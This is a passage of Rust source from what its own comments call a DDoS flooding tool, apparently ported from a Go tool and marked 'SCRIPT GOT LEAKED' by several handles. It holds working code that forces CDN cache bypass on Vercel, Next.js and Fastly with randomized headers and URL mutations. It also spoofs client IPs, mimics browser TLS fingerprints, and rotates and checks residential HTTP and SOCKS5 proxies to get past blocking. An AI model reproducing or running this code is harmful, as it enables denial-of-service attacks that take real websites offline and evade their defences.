            "no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0, s-maxage=0",
            "max-age=0, no-cache, no-store, must-revalidate, must-understand",
            "no-cache, no-store, max-age=0, s-maxage=0, proxy-revalidate",
            "private, no-cache, no-store, max-age=0, must-revalidate",
            "no-cache, no-store, must-revalidate, max-stale=0, min-fresh=0",
            "no-store, must-revalidate, proxy-revalidate, max-age=0",
            "no-cache, no-store, no-transform, must-revalidate, max-age=0",
            "no-cache, no-store, must-revalidate, pre-check=0, post-check=0, max-age=0",
            "no-cache, max-age=0, must-revalidate, proxy-revalidate, no-store, s-maxage=0, stale-if-error=0",
            "private, no-cache, no-store, must-revalidate, max-age=0, s-maxage=0, proxy-revalidate, no-transform",
        ];
        if let Some(pos) = headers.iter().position(|(k, _)| k == "cache-control") {
            headers.remove(pos);
        }
        headers.push(("cache-control".into(), cache_control_variants[rng.gen_range(0..cache_control_variants.len())].into()));
        headers.push(("pragma".into(), "no-cache".into()));

        // ── 2. Expires in the past ──
        let expires_dates = [
            "Thu, 01 Jan 1970 00:00:00 GMT",
            "Mon, 01 Jan 1990 00:00:00 GMT",
            "Wed, 09 Feb 1994 22:23:32 GMT",
            "Fri, 01 Jan 1980 00:00:00 GMT",
            "Sun, 06 Nov 1994 08:49:37 GMT",
            "0",
            "-1",
        ];
        headers.push(("expires".into(), expires_dates[rng.gen_range(0..expires_dates.len())].into()));

        // ── 3. Conditional request headers (force revalidation / origin fetch) ──
        let etag_formats: &[fn(&mut rand::rngs::ThreadRng) -> String] = &[
            |r| format!("W/\"{}\"", random_alphanum_rng(12, r)),
            |r| format!("W/\"{}-{}\"", random_alphanum_rng(8, r), random_alphanum_rng(6, r)),
            |r| format!("\"{}\"", random_alphanum_rng(12, r)),
            |r| format!("W/\"{}\"", hex::encode(r.gen::<[u8; 8]>())),
        ];
        headers.push(("if-none-match".into(), etag_formats[rng.gen_range(0..etag_formats.len())](&mut rng)));

        // 60% chance: If-Modified-Since in the past
        if rng.gen_bool(0.6) {
            let past_dates = [
                "Thu, 01 Jan 1970 00:00:01 GMT",
                "Sat, 01 Jan 2000 00:00:00 GMT",
                "Mon, 01 Jun 2015 12:00:00 GMT",
                "Tue, 15 Nov 1994 12:45:26 GMT",
                "Wed, 23 Oct 2024 08:54:04 GMT",
                "Wed, 23 Oct 2024 08:54:03 GMT",
            ];
            headers.push(("if-modified-since".into(), past_dates[rng.gen_range(0..past_dates.len())].into()));
        }

        // 30% chance: If-Unmodified-Since far in the past
        if rng.gen_bool(0.3) {
            headers.push(("if-unmodified-since".into(), "Thu, 01 Jan 1970 00:00:00 GMT".into()));
        }

        // ── 4. Accept-Encoding rotation (Vary: Accept-Encoding → different cache keys) ──
        let accept_encodings = [
            "gzip, deflate, br, zstd",
            "gzip, deflate, br",
            "gzip, deflate",
            "br, gzip, deflate",
            "gzip",
            "deflate",
            "br",
            "zstd, br, gzip, deflate",
            "identity",
            "gzip;q=1.0, deflate;q=0.6, br;q=0.8",
            "br;q=1.0, gzip;q=0.8, deflate;q=0.5",
            "gzip;q=1.0, br;q=0.9, deflate;q=0.5, zstd;q=0.7",
            "*",
            "gzip, deflate, br, zstd, identity",
            "compress, gzip, deflate, br",
        ];
        if let Some(pos) = headers.iter().position(|(k, _)| k == "accept-encoding") {
            headers.remove(pos);
        }
        headers.push(("accept-encoding".into(), accept_encodings[rng.gen_range(0..accept_encodings.len())].into()));

        // ── 5. X-Forwarded-For / X-Real-IP (CDN per-IP cache key pollution) ──
        if rng.gen_bool(0.6) {
            let fake_ip = format!("{}.{}.{}.{}", rng.gen_range(1..255), rng.gen_range(0..256), rng.gen_range(0..256), rng.gen_range(1..255));
            match rng.gen_range(0..4) {
                0 => { headers.push(("x-forwarded-for".into(), fake_ip)); }
                1 => {
                    let fake_ip2 = format!("{}.{}.{}.{}", rng.gen_range(1..255), rng.gen_range(0..256), rng.gen_range(0..256), rng.gen_range(1..255));
                    headers.push(("x-forwarded-for".into(), format!("{}, {}", fake_ip, fake_ip2)));
                }//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
                2 => {//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
                    headers.push(("x-forwarded-for".into(), fake_ip.clone()));
                    headers.push(("x-real-ip".into(), fake_ip));
                }
                _ => {
                    headers.push(("x-forwarded-for".into(), fake_ip.clone()));
                    headers.push(("true-client-ip".into(), fake_ip));
                }
            }//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
        }//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
        // ── 6. Via header (confuse proxy cache layers) ──
        if rng.gen_bool(0.3) {
            let via_versions = ["1.0", "1.1", "2.0"];
            let via_hosts = ["proxy", "cache", "cdn", "edge", "varnish", "squid"];
            headers.push(("via".into(), format!("{} {}{}.example.com",
                via_versions[rng.gen_range(0..via_versions.len())],
                via_hosts[rng.gen_range(0..via_hosts.len())],
                rng.gen_range(0..100))));
        }

        // ── 7. Authorization header (CDNs typically don't cache authenticated responses) ──
        if rng.gen_bool(0.25) {
            match rng.gen_range(0..3) {
                0 => { headers.push(("authorization".into(), format!("Bearer {}", random_alphanum(32)))); }
                1 => { headers.push(("authorization".into(), format!("Basic {}", base64_encode(format!("{}:{}", random_alphanum(6), random_alphanum(10)).as_bytes())))); }
                _ => { headers.push(("authorization".into(), format!("Token {}", random_alphanum(32)))); }
            }
        }

        // ── 8. X-Requested-With (bypass cached versions for AJAX vs normal) ──
        if rng.gen_bool(0.3) {
            let xrw = ["XMLHttpRequest", "Fetch", "com.android.browser"];
            headers.push(("x-requested-with".into(), xrw[rng.gen_range(0..xrw.len())].into()));
        }

        // ── 9. Range header trick (partial content → different cache key) ──
        if rng.gen_bool(0.15) {
            let range_variants = [
                "bytes=0-".to_string(),
                format!("bytes=0-{}", 1024 + rng.gen_range(0..65536)),
                "bytes=0-0".to_string(),
                format!("bytes={}-", rng.gen_range(0..1024)),
            ];
            headers.push(("range".into(), range_variants[rng.gen_range(0..range_variants.len())].clone()));
        }

        // ── 10. Accept header variation (some CDNs key on Accept) ──
        if rng.gen_bool(0.2) {
            let accept_variants = [
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "text/html,*/*;q=0.8",
                "application/json, text/html, */*;q=0.01",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            ];
            if let Some(pos) = headers.iter().position(|(k, _)| k == "accept") { headers.remove(pos); }
            headers.push(("accept".into(), accept_variants[rng.gen_range(0..accept_variants.len())].into()));
        }
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
        // ── 11. DNT / Sec-GPC ──
        if rng.gen_bool(0.3) {
            headers.push(("dnt".into(), rng.gen_range(0..2).to_string()));
        }
        if rng.gen_bool(0.2) {
            headers.push(("sec-gpc".into(), "1".into()));
        }
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
        // ── 12. Vercel / Next.js cache bypass ──
        let color_schemes = ["light", "dark", "no-preference"];
        headers.push(("sec-ch-prefers-color-scheme".into(), color_schemes[rng.gen_range(0..color_schemes.len())].into()));
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
        if rng.gen_bool(0.5) {
            let rm = ["no-preference", "reduce"];
            headers.push(("sec-ch-prefers-reduced-motion".into(), rm[rng.gen_range(0..rm.len())].into()));
        }
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
        if rng.gen_bool(0.4) {
            headers.push(("rsc".into(), "1".into()));
            if rng.gen_bool(0.6) {
                headers.push(("next-router-state-tree".into(), format!("[\"\",{{\"children\":[\"{}\",{{\"children\":[\"__PAGE__\",{{}}]}}]}}]", random_alphanum(6))));
            }
            if rng.gen_bool(0.5) {
                headers.push(("next-router-prefetch".into(), "1".into()));
            }
            if rng.gen_bool(0.5) {
                headers.push(("next-url".into(), format!("/{}", random_alphanum(rng.gen_range(4..12)))));
            }
        }

        if rng.gen_bool(0.3) {
            headers.push(("x-middleware-prefetch".into(), "1".into()));
        }

        if rng.gen_bool(0.3) {
            headers.push(("x-nextjs-data".into(), "1".into()));
        }

        if rng.gen_bool(0.3) {
            let purposes = ["prefetch", "preview"];
            headers.push(("purpose".into(), purposes[rng.gen_range(0..purposes.len())].into()));
            headers.push(("sec-purpose".into(), purposes[rng.gen_range(0..purposes.len())].into()));
        }

        // x-vercel-ip-* spoofing
        if rng.gen_bool(0.4) {
            let countries = ["US", "DE", "FR", "GB", "JP", "BR", "IN", "AU", "CA", "RU", "CN", "KR", "SG", "NL", "SE"];
            let cities = ["New York", "Berlin", "Paris", "London", "Tokyo", "Sao Paulo", "Mumbai", "Sydney", "Toronto", "Moscow"];
            let fake_ip = format!("{}.{}.{}.{}", rng.gen_range(1..255), rng.gen_range(0..256), rng.gen_range(0..256), rng.gen_range(1..255));
            headers.push(("x-vercel-ip-country".into(), countries[rng.gen_range(0..countries.len())].into()));
            headers.push(("x-vercel-ip-city".into(), cities[rng.gen_range(0..cities.len())].into()));
            headers.push(("x-vercel-ip-country-region".into(), random_alphanum(2)));
            headers.push(("x-real-ip".into(), fake_ip.clone()));
            headers.push(("x-forwarded-for".into(), fake_ip));
        }

        // React Server Components accept
        if rng.gen_bool(0.2) {
            let rsc_accepts = ["text/x-component", "application/rsc", "text/html, application/rsc, */*;q=0.01"];
            if let Some(pos) = headers.iter().position(|(k, _)| k == "accept") { headers.remove(pos); }
            headers.push(("accept".into(), rsc_accepts[rng.gen_range(0..rsc_accepts.len())].into()));
        }

        // ── 13. Fastly CDN cache bypass (Varnish-based) ──
        if rng.gen_bool(0.4) {
            let surrogates = [
                "no-store",
                "max-age=0, no-store, no-cache",
                "no-store, must-revalidate",
                "private, no-store",
                "max-age=0",
                "stale-while-revalidate=0, stale-if-error=0, max-age=0",
            ];
            headers.push(("surrogate-control".into(), surrogates[rng.gen_range(0..surrogates.len())].into()));
        }

        if rng.gen_bool(0.3) {
            headers.push(("fastly-debug".into(), "1".into()));
        }

        if rng.gen_bool(0.25) {
            headers.push(("fastly-no-shield".into(), "1".into()));
        }

        if rng.gen_bool(0.35) {
            let fake_ip = format!("{}.{}.{}.{}", rng.gen_range(1..255), rng.gen_range(0..256), rng.gen_range(0..256), rng.gen_range(1..255));
            headers.push(("fastly-client-ip".into(), fake_ip));
        }

        if rng.gen_bool(0.2) {
            headers.push(("x-varnish".into(), (100_000_000 + rng.gen_range(0..899_999_999)).to_string()));
        }

        if rng.gen_bool(0.25) {
            let protos = ["http", "https", "h2", "h2c"];
            headers.push(("x-forwarded-proto".into(), protos[rng.gen_range(0..protos.len())].into()));
        }

        if rng.gen_bool(0.15) {
            let te_values = ["trailers", "chunked", "trailers, deflate", "gzip, chunked"];
            headers.push(("te".into(), te_values[rng.gen_range(0..te_values.len())].into()));
        }

        if rng.gen_bool(0.2) {
            headers.push(("x-deployment-id".into(), format!("dpl_{}", random_alphanum(20))));
        }
    }

    headers
}

/// Helper to generate random alphanumeric with a provided rng
fn random_alphanum_rng(len: usize, rng: &mut rand::rngs::ThreadRng) -> String {
    rng.sample_iter(&Alphanumeric)
        .take(len)
        .map(char::from)
        .collect()
}

/// Aggressive cache-bypass URL mutation (ported from SILENA-v7.go addCacheBypassToURL)
fn add_cache_bypass_to_url(path: &str) -> String {
    let mut rng = rand::thread_rng();
    let mut path = path.to_string();

    // ── 1. Query parameter cache busting ──
    let param_names = [
        "cb", "_", "nocache", "t", "v", "r", "_dc",
        "_t", "_r", "cache", "nc", "bust", "rnd", "z",
        "_ts", "_v", "_nc", "q", "_q", "ref", "sid",
        "utm_source", "utm_medium", "utm_campaign", "utm_content",
        "fbclid", "gclid", "msclkid", "yclid",
        "_ga", "_gl", "__cf_chl_tk",
    ];
    let name = param_names[rng.gen_range(0..param_names.len())];
    let sep = if path.contains('?') { '&' } else { '?' };

    match rng.gen_range(0..6) {
        0 => { path = format!("{}{}{}={}", path, sep, name, random_alphanum(rng.gen_range(8..16))); }
        1 => {
            let ts = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap_or_default().as_nanos();
            path = format!("{}{}{}={}", path, sep, name, ts);
        }
        2 => {
            let ts = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap_or_default().as_millis();
            path = format!("{}{}{}={}{}", path, sep, name, random_alphanum(4), ts);
        }
        3 => {
            // UUID-like
            path = format!("{}{}{}={}-{}-{}-{}", path, sep, name,
                random_alphanum(8), random_alphanum(4), random_alphanum(4), random_alphanum(12));
        }
        4 => {
            // Base64-like
            let raw: Vec<u8> = (0..rng.gen_range(12..24)).map(|_| rng.gen()).collect();
            path = format!("{}{}{}={}", path, sep, name, base64_encode(&raw).replace('=', ""));
        }
        _ => {
            // Double param
            path = format!("{}{}{}={}", path, sep, name, random_alphanum(6));
            let mut name2 = param_names[rng.gen_range(0..param_names.len())];
            while name2 == name { name2 = param_names[rng.gen_range(0..param_names.len())]; }
            let ts = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap_or_default().as_nanos();
            path = format!("{}&{}={}", path, name2, ts);
        }
    }

    // ── 2. Path-based cache busting (35% chance) ──
    if rng.gen_bool(0.35) {
        let split_at = path.find('?').or_else(|| path.find('#')).unwrap_or(path.len());
        let (base_part, query_part) = path.split_at(split_at);
        let base = base_part.to_string();
        let query = query_part.to_string();

        let new_base = match rng.gen_range(0..12) {
            0 => {
                // /path/./page
                if let Some(idx) = base.rfind('/') {
                    if idx > 0 { format!("{}/.", &base[..idx]) + &base[idx..] } else { base.clone() }
                } else { base.clone() }
            }
            1 => {
                // Double slash /path//page
                if let Some(idx) = base.rfind('/') {
                    format!("{}/", &base[..idx]) + &base[idx..]
                } else { base.clone() }
            }
            2 => format!("{};{}={}", base, random_alphanum(3), random_alphanum(5)),
            3 => {
                // Trailing dot or %00
                if rng.gen_bool(0.5) { format!("{}.", base) } else { format!("{}%00", base) }
            }
            4 => {
                let exts = [".html", ".js", ".css", ".json", ".xml", ".php", ".asp", ".rsc"];
                format!("{}{}", base, exts[rng.gen_range(0..exts.len())])
            }
            5 => {
                // Next.js _next/data path
                format!("/_next/data/{}{}.json", random_alphanum(20), base)
            }
            6 => {
                // API route probing
                let api_paths = [
                    format!("/api/{}", random_alphanum(6)),
                    format!("/api/auth/{}", random_alphanum(4)),
                    format!("/api/revalidate?secret={}", random_alphanum(16)),
                    format!("/api/preview?token={}", random_alphanum(12)),
                ];
                api_paths[rng.gen_range(0..api_paths.len())].clone()
            }
            7 => {
                // RSC flight path
                let rsc_paths = [
                    format!("{}?_rsc={}", base, random_alphanum(5)),
                    format!("{}?__nextFallback=true", base),
                    format!("{}?__flight__=1&__action__={}", base, random_alphanum(8)),
                ];
                rsc_paths[rng.gen_range(0..rsc_paths.len())].clone()
            }
            8 => {
                // Case variation (Varnish case-sensitive hash)
                let mut bytes = base.as_bytes().to_vec();
                for _ in 0..rng.gen_range(1..4) {
                    if bytes.len() > 1 {
                        let idx = 1 + rng.gen_range(0..bytes.len() - 1);
                        if bytes[idx] >= b'a' && bytes[idx] <= b'z' {
                            bytes[idx] -= 32;
                        }
                    }
                }
                String::from_utf8_lossy(&bytes).to_string()
            }
            9 => {
                // Trailing slash variation
                if base.ends_with('/') { base.trim_end_matches('/').to_string() } else { format!("{}/", base) }
            }
            10 => {
                // URL-encoded char
                if base.len() > 2 {
                    let idx = 1 + rng.gen_range(0..base.len() - 1);
                    let bytes = base.as_bytes();
                    if idx < bytes.len() && bytes[idx] >= b'a' && bytes[idx] <= b'z' {
                        format!("{}%{:02x}{}", &base[..idx], bytes[idx], &base[idx + 1..])
                    } else { base.clone() }
                } else { base.clone() }
            }
            _ => base.clone(),
        };
        path = format!("{}{}", new_base, query);
    }

    // ── 3. Fragment randomization (20% chance) ──
    if rng.gen_bool(0.20) {
        path = format!("{}#{}", path, random_alphanum(rng.gen_range(4..10)));
    }

    path
}


// Create browser-specific TLS config
fn create_browser_tls_config(browser: BrowserType) -> Result<ClientConfig, Box<dyn Error + Send + Sync>> {
    let mut root_store = RootCertStore::empty();
    root_store.add_trust_anchors(webpki_roots::TLS_SERVER_ROOTS.iter().map(|ta| {
        rustls::OwnedTrustAnchor::from_subject_spki_name_constraints(
            ta.subject,
            ta.spki,
            ta.name_constraints,
        )
    }));

    let (cipher_suites, kx_groups, alpn_protocols) = match browser {
        BrowserType::Chrome => (
            CHROME_CIPHER_SUITES,
            CHROME_KX_GROUPS,
            vec![b"h2".to_vec(), b"http/1.1".to_vec()],
        ),
        BrowserType::Firefox => (
            FIREFOX_CIPHER_SUITES,
            FIREFOX_KX_GROUPS,
            vec![b"h2".to_vec(), b"http/1.1".to_vec()],
        ),
        BrowserType::Safari => (
            SAFARI_CIPHER_SUITES,
            SAFARI_KX_GROUPS,
            vec![b"h2".to_vec(), b"http/1.1".to_vec()],
        ),
        BrowserType::Edge => (
            CHROME_CIPHER_SUITES, // Edge uses Chromium
            CHROME_KX_GROUPS,
            vec![b"h2".to_vec(), b"http/1.1".to_vec()],
        ),
    };

    let mut config = ClientConfig::builder()
        .with_cipher_suites(cipher_suites)
        .with_kx_groups(kx_groups)
        .with_protocol_versions(&[&rustls::version::TLS13, &rustls::version::TLS12])?
        .with_root_certificates(root_store)
        .with_no_client_auth();

    config.alpn_protocols = alpn_protocols;

    Ok(config)
}


// Load proxy list from file
// When auth=true, lines are parsed as host:port:user:pass (maskify format)
fn load_proxy_list(filepath: &str, auth: bool) -> Result<Vec<String>, Box<dyn Error + Send + Sync>> {
    let content = fs::read_to_string(filepath)
        .map_err(|e| format!("Failed to read proxy file '{}': {}", filepath, e))?;
    
    let proxies: Vec<String> = content
        .lines()
        .map(|line| line.trim())
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .filter_map(|line| {
            if auth {
                // Parse host:port:user:pass format
                let parts: Vec<&str> = line.splitn(4, ':').collect();
                if parts.len() == 4 {
                    let host = parts[0];
                    let port = parts[1];
                    let user = parts[2];
                    let pass = parts[3];
                    Some(format!("http://{}:{}@{}:{}", user, pass, host, port))
                } else {
                    eprintln!("  {} invalid auth proxy line (expected host:port:user:pass): {}", "[WARN]".yellow(), line);
                    None
                }
            } else {
                // Preserve existing scheme, default to http:// if none
                if line.starts_with("http://") || line.starts_with("https://") || line.starts_with("socks5://") {
                    Some(line.to_string())
                } else {
                    Some(format!("http://{}", line))
                }
            }
        })
        .collect();
    
    if proxies.is_empty() {
        return Err(format!("No valid proxies found in '{}'", filepath).into());
    }
    
    Ok(proxies)
}

// Round-robin proxy rotator shared across workers (with blacklist support like Go's ProxyManager)
struct ProxyRotator {
    proxies: Vec<String>,
    idx: AtomicUsize,
    blacklisted: Mutex<HashSet<String>>,
}

impl ProxyRotator {
    fn new(proxies: Vec<String>) -> Self {
        Self {
            proxies,
            idx: AtomicUsize::new(0),
            blacklisted: Mutex::new(HashSet::new()),
        }
    }

    /// Get next proxy, skipping blacklisted ones
    fn next_proxy(&self) -> Option<&str> {
        let n = self.proxies.len();
        if n == 0 {
            return None;
        }
        let bl = self.blacklisted.lock().unwrap();
        for _ in 0..n {
            let i = self.idx.fetch_add(1, Ordering::Relaxed);
            let proxy = &self.proxies[i % n];
            if !bl.contains(proxy) {
                return Some(proxy);
            }
        }
        // All blacklisted
        None
    }

    /// Blacklist a proxy (403 = blocked IP)
    fn blacklist(&self, proxy: &str) {
        if let Ok(mut bl) = self.blacklisted.lock() {
            if bl.insert(proxy.to_string()) {
                eprintln!(
                    "  {} proxy blacklisted (403): {}",
                    "[SKIP]".red(),
                    proxy
                );
            }
        }
    }

    fn blacklisted_count(&self) -> usize {
        self.blacklisted.lock().map(|bl| bl.len()).unwrap_or(0)
    }

    fn is_empty(&self) -> bool {
        self.proxies.is_empty()
    }

    fn active_count(&self) -> usize {
        self.proxies.len().saturating_sub(self.blacklisted_count())
    }
}

// Enhanced proxy connection for DDoS flooding
// Supports: HTTP CONNECT, HTTPS CONNECT, SOCKS5
async fn create_proxy_connection(
    proxy_url: &str,
    target_host: &str,
    target_port: u16,
) -> Result<TcpStream, Box<dyn Error + Send + Sync>> {
    async fn read_connect_response<S>(stream: &mut S) -> Result<(), Box<dyn Error + Send + Sync>>
    where
        S: AsyncRead + Unpin,
    {
        let mut buf = Vec::with_capacity(1024);
        let mut chunk = [0u8; 512];

        loop {
            let n = stream.read(&mut chunk).await?;
            if n == 0 {
                return Err("Proxy closed connection during CONNECT".into());
            }
            buf.extend_from_slice(&chunk[..n]);
            if buf.len() > 8192 {
                return Err("Proxy CONNECT header too large".into());
            }
            if buf.windows(4).any(|w| w == b"\r\n\r\n") {
                break;
            }
        }

        let response_str = String::from_utf8_lossy(&buf);
        let status_line = response_str.lines().next().unwrap_or_default();
        if !(status_line.starts_with("HTTP/") && status_line.contains(" 200")) {
            return Err(format!("Proxy CONNECT failed: {}", status_line).into());
        }
        Ok(())
    }

    // Extract residential proxy auth (supports user:pass@host:port)
    let (clean_proxy_url, proxy_auth) = extract_proxy_auth(proxy_url);
    let auth_header = proxy_auth
        .as_ref()
        .map(|a| format!("Proxy-Authorization: {}\r\n", a))
        .unwrap_or_default();

    // Parse proxy URL (cleaned of userinfo)
    let proxy_uri: Uri = clean_proxy_url.parse()?;
    let proxy_host = proxy_uri.host().ok_or("Invalid proxy host")?;
    let proxy_port = proxy_uri.port_u16().unwrap_or(8080);
    let proxy_scheme = proxy_uri.scheme_str().unwrap_or("http");

    // Connect to proxy with aggressive timeout for DDoS
    let proxy_addr = format!("{}:{}", proxy_host, proxy_port);
    let mut proxy_addrs = lookup_host(&proxy_addr).await?;
    let proxy_socket_addr = proxy_addrs.next().ok_or("No proxy address found")?;
    
    let mut stream = match timeout(Duration::from_secs(10), TcpStream::connect(proxy_socket_addr)).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => return Err(format!("Proxy TCP connect error: {}", e).into()),
        Err(_) => return Err("Proxy TCP connect timed out".into()),
    };

    // Disable Nagle for low-latency proxy handshake
    let _ = stream.set_nodelay(true);

    // Detect proxy type (SOCKS5 or HTTP/HTTPS)
    if proxy_scheme == "socks5" || proxy_url.contains("socks5://") {
        // Extract SOCKS5 credentials from original proxy URL (user:pass@host:port)
        let socks5_auth: Option<(String, String)> = {
            let without_scheme = proxy_url
                .strip_prefix("socks5://")
                .unwrap_or(proxy_url);
            if let Some(at_pos) = without_scheme.find('@') {
                let userinfo = &without_scheme[..at_pos];
                if let Some(colon) = userinfo.find(':') {
                    Some((
                        userinfo[..colon].to_string(),
                        userinfo[colon + 1..].to_string(),
                    ))
                } else {
                    None
                }
            } else {
                None
            }
        };

        // SOCKS5 proxy handshake
        if socks5_auth.is_some() {
            // Offer both no-auth (0x00) and username/password (0x02)
            stream.write_all(&[0x05, 0x02, 0x00, 0x02]).await?;
        } else {
            // Only offer no-auth (0x00)
            stream.write_all(&[0x05, 0x01, 0x00]).await?;
        }

        // Read server method selection
        let mut response = [0u8; 2];
        stream.read_exact(&mut response).await?;
        if response[0] != 0x05 {
            return Err(format!("SOCKS5 invalid version: {}", response[0]).into());
        }

        match response[1] {
            0x00 => { /* No auth required, proceed */ }
            0x02 => {
                // Username/password authentication (RFC 1929)
                let (user, pass) = socks5_auth
                    .ok_or("SOCKS5 server requires auth but no credentials provided")?;
                let mut auth_req = vec![0x01]; // VER of sub-negotiation
                auth_req.push(user.len() as u8);
                auth_req.extend_from_slice(user.as_bytes());
                auth_req.push(pass.len() as u8);
                auth_req.extend_from_slice(pass.as_bytes());
                stream.write_all(&auth_req).await?;

                let mut auth_resp = [0u8; 2];
                stream.read_exact(&mut auth_resp).await?;
                if auth_resp[1] != 0x00 {
                    return Err("SOCKS5 authentication failed (bad credentials)".into());
                }
            }
            0xFF => {
                return Err("SOCKS5 server rejected all auth methods".into());
            }
            other => {
                return Err(format!("SOCKS5 unsupported auth method: {}", other).into());
            }
        }

        // Send CONNECT request
        // VER(0x05) CMD(0x01=CONNECT) RSV(0x00) ATYP(0x03=domain)
        let mut connect_req = vec![0x05, 0x01, 0x00, 0x03];
        connect_req.push(target_host.len() as u8);
        connect_req.extend_from_slice(target_host.as_bytes());
        connect_req.extend_from_slice(&target_port.to_be_bytes());
        stream.write_all(&connect_req).await?;

        // Read CONNECT response
        let mut reply = [0u8; 10]; // Max size for IPv4
        stream.read_exact(&mut reply[..4]).await?;
        if reply[0] != 0x05 || reply[1] != 0x00 {
            return Err(format!("SOCKS5 CONNECT failed: code {}", reply[1]).into());
        }

        // Read rest of response (address type dependent)
        match reply[3] {
            0x01 => { stream.read_exact(&mut reply[4..10]).await?; } // IPv4
            0x03 => {
                let len = stream.read_u8().await?;
                let mut domain_buf = vec![0u8; len as usize + 2];
                stream.read_exact(&mut domain_buf).await?;
            }
            0x04 => {
                let mut ipv6_buf = [0u8; 18];
                stream.read_exact(&mut ipv6_buf).await?;
            }
            _ => return Err("Invalid SOCKS5 ATYP".into()),
        };

        Ok(stream)
    } else if proxy_scheme == "https" {
        // HTTPS proxy - establish TLS with proxy first
        let tls_config = create_browser_tls_config(BrowserType::Chrome)?;
        let connector = TlsConnector::from(Arc::new(tls_config));
        let domain = rustls::ServerName::try_from(proxy_host)?;
        let mut tls_stream: TlsStream<TcpStream> = connector.connect(domain, stream).await?;

        // Send CONNECT request through TLS (with auth for residential proxies)
        let connect_req = format!(
            "CONNECT {}:{} HTTP/1.1\r\nHost: {}:{}\r\n{}Proxy-Connection: Keep-Alive\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
            target_host, target_port, target_host, target_port, auth_header
        );
        tls_stream.write_all(connect_req.as_bytes()).await?;

        // Read CONNECT response (longer timeout for residential proxies)
        timeout(Duration::from_secs(10), read_connect_response(&mut tls_stream)).await??;

        // Return plain stream after CONNECT for target TLS
        // NOTE: This requires connection downgrade - not fully supported
        // For production use, consider using a different approach
        return Err("HTTPS proxy tunneling with TLS downgrade not fully supported - use HTTP or SOCKS5 proxy".into());
    } else {
        // HTTP proxy - send CONNECT request (with auth for residential proxies)
        let connect_req = format!(
            "CONNECT {}:{} HTTP/1.1\r\nHost: {}:{}\r\n{}Proxy-Connection: Keep-Alive\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
            target_host, target_port, target_host, target_port, auth_header
        );
        stream.write_all(connect_req.as_bytes()).await?;

        // Read CONNECT response (longer timeout for residential proxies)
        timeout(Duration::from_secs(10), read_connect_response(&mut stream)).await??;

        Ok(stream)
    }
}


/// Verify phase 1: raw TCP + TLS connectivity test (no HTTP).
async fn verify_proxy_phase1(
    proxy_url: &str,
    target_host: &str,
    target_port: u16,
) -> Result<(), Box<dyn Error + Send + Sync>> {
    let tcp_stream = timeout(
        Duration::from_secs(6),
        create_proxy_connection(proxy_url, target_host, target_port),
    )
    .await
    .map_err(|_| "phase1: connection timed out")??;

    let _ = tcp_stream.set_nodelay(true);

    let tls_config = create_browser_tls_config(BrowserType::Chrome)?;
    let connector = TlsConnector::from(Arc::new(tls_config));
    let domain = rustls::ServerName::try_from(target_host)?;

    let tls_stream = timeout(
        Duration::from_secs(6),
        connector.connect(domain, tcp_stream),
    )
    .await
    .map_err(|_| "phase1: TLS timed out")??;

    drop(tls_stream);
    Ok(())
}//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
/// Verify phase 2: HTTP HEAD to filter 403/407.
async fn verify_proxy_phase2(
    proxy_url: &str,
    target_host: &str,
    target_port: u16,
    target_path: &str,
) -> Result<u16, Box<dyn Error + Send + Sync>> {
    let tcp_stream = timeout(
        Duration::from_secs(8),
        create_proxy_connection(proxy_url, target_host, target_port),
    )
    .await
    .map_err(|_| "phase2: connection timed out")??;

    let _ = tcp_stream.set_nodelay(true);

    let tls_config = create_browser_tls_config(BrowserType::Chrome)?;
    let connector = TlsConnector::from(Arc::new(tls_config));
    let domain = rustls::ServerName::try_from(target_host)?;

    let mut tls_stream = timeout(
        Duration::from_secs(8),
        connector.connect(domain, tcp_stream),
    )
    .await
    .map_err(|_| "phase2: TLS timed out")??;
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    let req = format!(//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
        "HEAD {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nAccept: */*\r\nConnection: close\r\n\r\n",
        target_path, target_host
    );//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    tls_stream.write_all(req.as_bytes()).await?;

    let mut buf = Vec::with_capacity(1024);
    let mut chunk = [0u8; 512];
    let _ = timeout(Duration::from_secs(8), async {
        loop {
            let n = tls_stream.read(&mut chunk).await?;
            if n == 0 { break; }
            buf.extend_from_slice(&chunk[..n]);
            if buf.windows(4).any(|w| w == b"\r\n\r\n") || buf.len() > 4096 { break; }
        }
        Ok::<(), Box<dyn Error + Send + Sync>>(())
    }).await;

    if buf.is_empty() {
        return Err("phase2: empty response".into());
    }
